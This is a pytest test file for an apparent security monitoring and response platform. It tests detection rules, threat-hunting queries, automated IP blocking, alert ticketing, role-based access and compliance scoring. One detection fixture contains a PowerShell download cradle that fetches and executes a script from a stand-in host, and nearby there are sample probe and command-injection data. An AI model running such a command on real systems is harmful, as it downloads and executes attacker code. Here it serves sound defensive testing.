import asyncio

import pytest
from fastapi import HTTPException

from app.core.rbac import UserContext, UserRole, require_role
from app.detection.engine import DetectionEngine
from app.schemas.detection_alert import DetectionAlert
from app.schemas.log_event import LogEvent
from app.schemas.severity import Severity
from app.services.compliance_service import ComplianceAuditService
from app.services.hunting_service import ThreatHuntingEngine
from app.services.soar_service import SOARService


def test_sigma_community_rules_matching():
    engine = DetectionEngine()

    # 1. WordPress admin probe (rules/wordpress_admin_probe.yml)
    wp_event = LogEvent(
        source_ip="185.220.101.5",
        method="GET",
        endpoint="/wp-admin/install.php",
        status_code=404,
        raw_log='185.220.101.5 - - [21/Nov/2026:04:00:00] "GET /wp-admin/install.php HTTP/1.1" 404 120',
        parser_name="nginx",
    )
    alerts = engine.process_event(wp_event)
    titles = [a.title.lower() for a in alerts]
    assert any("wordpress" in t or "admin probe" in t for t in titles)

    # 2. Suspicious PowerShell Download Cradle (rules/windows_powershell_download.yml)
    ps_event = LogEvent(
        source_ip="10.0.0.50",
        user="attacker",
        command_line="powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.corp/payload.ps1')",
        endpoint="/windows/exec",
        raw_log="PowerShell Download Cradle",
        parser_name="windows_event",
    )
    ps_alerts = engine.process_event(ps_event)
    assert any(
        "powershell" in a.title.lower() or "powershell" in a.rule_name.lower()
        for a in ps_alerts
    )


def test_threat_hunting_engine_queries():
    sample_events = [
        {
            "source_ip": "192.168.1.100",
            "endpoint": "/api/v1/auth/login",
            "method": "POST",
            "status_code": 401,
            "user": "root",
            "raw_log": "POST /api/v1/auth/login 401",
        },
        {
            "source_ip": "192.168.1.101",
            "endpoint": "/api/v1/users",
            "method": "GET",
            "status_code": 200,
            "user": "admin",
            "raw_log": "GET /api/v1/users 200",
        },
        {
            "source_ip": "10.0.0.5",
            "endpoint": "/admin/config",
            "method": "POST",
            "status_code": 500,
            "user": "dev",
            "raw_log": "POST /admin/config 500",
        },
    ]

    # Query 1: Wildcard source IP and status code comparison
    res1 = ThreatHuntingEngine.search(
        "source_ip:192.168.1.* AND status_code:>=400",
        sample_events,
    )
    assert res1.total_hits == 1
    assert res1.results[0]["source_ip"] == "192.168.1.100"
    assert "401" in res1.facets["status_code"]

    # Query 2: Method and free-text
    res2 = ThreatHuntingEngine.search(
        "method:POST config",
        sample_events,
    )
    assert res2.total_hits == 1
    assert res2.results[0]["endpoint"] == "/admin/config"


def test_soar_firewall_and_ticketing():
    # 1. Cloudflare WAF block
    cf_res = asyncio.run(
        SOARService.execute_cloudflare_waf_block(
            ip="198.51.100.99", zone_id="zone-123", api_token="mock_token"
        )
    )
    assert cf_res["status"] in ("SUCCESS", "SIMULATED")
    assert SOARService.is_ip_quarantined("198.51.100.99") is True

    # 2. Linux iptables DROP command generator
    iptables_res = SOARService.execute_linux_iptables_block(
        "203.0.113.88", dry_run=True
    )
    assert iptables_res["status"] == "DRY_RUN"
    assert "iptables -A INPUT -s 203.0.113.88 -j DROP" in iptables_res["command"]

    # 3. PagerDuty and Jira ticketing
    sample_alert = DetectionAlert(
        rule_name="cmd_injection",
        rule_version="1.0.0",
        severity=Severity.CRITICAL,
        confidence=0.99,
        risk_score=95.0,
        title="Critical Remote Code Execution",
        description="RCE detected in shell command",
        source_ip="203.0.113.88",
        endpoint="/cgi-bin/test.sh",
        attack_type="Command Injection",
        raw_log_reference="whoami",
    )
    pd_res = asyncio.run(SOARService.dispatch_pagerduty_alert(sample_alert))
    assert pd_res["status"] in ("SENT", "SIMULATED")

    jira_payload = SOARService.create_jira_ticket_payload(
        sample_alert, project_key="SEC"
    )
    assert jira_payload["fields"]["project"]["key"] == "SEC"
    assert "Critical Remote Code Execution" in jira_payload["fields"]["summary"]

    slack_card = SOARService.build_slack_alert_card(sample_alert)
    assert len(slack_card["attachments"][0]["actions"]) == 3


def test_rbac_authorization():
    # Tier 1 analyst cannot access Tier 2 actions
    tier1_user = UserContext(
        user_id="u1",
        email="u1@corp.local",
        role=UserRole.TIER_1_ANALYST,
        tenant_id="t1",
    )
    tier2_checker = require_role(UserRole.TIER_2_ANALYST, UserRole.ADMIN)

    with pytest.raises(HTTPException) as exc:
        tier2_checker(tier1_user)
    assert exc.value.status_code == 403

    # Admin passes all checks
    admin_user = UserContext(
        user_id="root", email="admin@corp.local", role=UserRole.ADMIN, tenant_id="t1"
    )
    assert tier2_checker(admin_user) == admin_user


def test_compliance_audit_reports():
    # 1. PCI-DSS report
    pci = ComplianceAuditService.evaluate_pci_dss(alerts_count=10, quarantined_count=3)
    assert pci.framework == "PCI-DSS v4.0"
    assert pci.compliance_score == 100.0
    assert len(pci.controls) == 4

    # 2. HIPAA report
    hipaa = ComplianceAuditService.evaluate_hipaa(alerts_count=10)
    assert hipaa.framework == "HIPAA"
    assert hipaa.compliance_score == 100.0

    # 3. SOC 2 report
    soc2 = ComplianceAuditService.evaluate_soc2(alerts_count=10)
    assert soc2.framework == "SOC 2 Type II"
    assert soc2.compliance_score == 100.0
